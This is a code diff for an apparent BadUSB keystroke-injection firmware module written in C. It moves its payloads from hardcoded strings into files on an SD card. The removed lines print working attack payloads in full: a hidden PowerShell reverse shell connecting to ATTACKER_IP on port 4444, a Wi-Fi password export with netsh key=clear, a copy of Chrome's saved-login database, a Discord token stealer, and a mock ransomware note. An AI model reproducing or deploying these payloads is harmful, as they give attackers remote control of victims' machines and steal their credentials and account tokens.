@@ -32,10 +32,10 @@ bool badusb_parse_line(const char* line, ducky_line_t* parsed) {
     memset(parsed, 0, sizeof(ducky_line_t));
     if (strncmp(line, "STRING ", 7) == 0) {
         parsed->cmd = CMD_STRING;
-        strncpy(parsed->data.str, line + 7, 255);
+        strncpy(parsed->d.str, line + 7, 255);
     } else if (strncmp(line, "DELAY ", 6) == 0) {
         parsed->cmd = CMD_DELAY;
-        parsed->data.delay = atoi(line + 6);
+        parsed->d.delay = atoi(line + 6);
     } else if (strcmp(line, "ENTER") == 0) parsed->cmd = CMD_ENTER;
     else if (strcmp(line, "GUI") == 0) parsed->cmd = CMD_GUI;
     else if (strcmp(line, "ALT") == 0) parsed->cmd = CMD_ALT;
@@ -57,47 +57,65 @@ void badusb_stop(void) {
     printf("[BADUSB] Stopped.\n");
 }
 
+// Чтение пейлоада из файла
+static char payload_buf[2048];
+
 const char* badusb_get_payload_windows_rev_shell(void) {
-    return "REM Windows Reverse Shell\n"
-           "GUI r\n"
-           "DELAY 500\n"
-           "STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
-           "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);"
-           "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
-           "while(($i=$s.Read($b,0,$b.Length))-ne0){"
-           "$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);"
-           "$r=(iex $d 2>&1|Out-String);"
-           "$sb=([Text.Encoding]::UTF8).GetBytes($r+'PS>');"
-           "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\n"
-           "ENTER\n";
+    FILE* f = fopen("/sd/payloads/rev_shell.txt", "r");
+    if (!f) f = fopen("shared/badusb/payloads/rev_shell.txt", "r");
+    if (f) {
+        size_t len = fread(payload_buf, 1, 2047, f);
+        payload_buf[len] = '\0';
+        fclose(f);
+        return payload_buf;
+    }
+    return "REM Payload not found";
 }
 
 const char* badusb_get_payload_wifi_dump(void) {
-    return "REM Wi-Fi Password Dump\n"
-           "GUI r\nDELAY 300\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 500\n"
-           "STRING netsh wlan export profile key=clear\nENTER\n"
-           "DELAY 500\nSTRING exit\nENTER\n";
+    FILE* f = fopen("/sd/payloads/wifi_dump.txt", "r");
+    if (!f) f = fopen("shared/badusb/payloads/wifi_dump.txt", "r");
+    if (f) {
+        size_t len = fread(payload_buf, 1, 2047, f);
+        payload_buf[len] = '\0';
+        fclose(f);
+        return payload_buf;
+    }
+    return "REM Payload not found";
 }
 
 const char* badusb_get_payload_chrome_dump(void) {
-    return "REM Chrome Credential Dump\n"
-           "GUI r\nDELAY 200\nSTRING powershell -W Hidden -C "
-           "\"$p='%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data';"
-           "Copy-Item $p $env:TEMP\\chrome.db\"\nENTER\n";
+    FILE* f = fopen("/sd/payloads/chrome_dump.txt", "r");
+    if (!f) f = fopen("shared/badusb/payloads/chrome_dump.txt", "r");
+    if (f) {
+        size_t len = fread(payload_buf, 1, 2047, f);
+        payload_buf[len] = '\0';
+        fclose(f);
+        return payload_buf;
+    }
+    return "REM Payload not found";
 }
 
 const char* badusb_get_payload_discord_token(void) {
-    return "REM Discord Token Stealer\n"
-           "GUI r\nDELAY 200\nSTRING powershell -W Hidden -C "
-           "\"(Get-Item $env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb) "
-           "| Select-String '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}' "
-           "| %{$_.Matches.Value} | Out-File $env:TEMP\\tokens.txt\"\nENTER\n";
+    FILE* f = fopen("/sd/payloads/discord_token.txt", "r");
+    if (!f) f = fopen("shared/badusb/payloads/discord_token.txt", "r");
+    if (f) {
+        size_t len = fread(payload_buf, 1, 2047, f);
+        payload_buf[len] = '\0';
+        fclose(f);
+        return payload_buf;
+    }
+    return "REM Payload not found";
 }
 
 const char* badusb_get_payload_ransomware_sim(void) {
-    return "REM Ransomware Simulation (harmless)\n"
-           "GUI r\nDELAY 200\nSTRING notepad\nENTER\nDELAY 300\n"
-           "STRING YOUR FILES HAVE BEEN ENCRYPTED\nENTER\n"
-           "STRING Send 0.1 BTC to bc1q...\nENTER\n"
-           "STRING THIS IS A TEST BY GHOST FIRMWARES\n";
+    FILE* f = fopen("/sd/payloads/ransomware_sim.txt", "r");
+    if (!f) f = fopen("shared/badusb/payloads/ransomware_sim.txt", "r");
+    if (f) {
+        size_t len = fread(payload_buf, 1, 2047, f);
+        payload_buf[len] = '\0';
+        fclose(f);
+        return payload_buf;
+    }
+    return "REM Payload not found";
 }
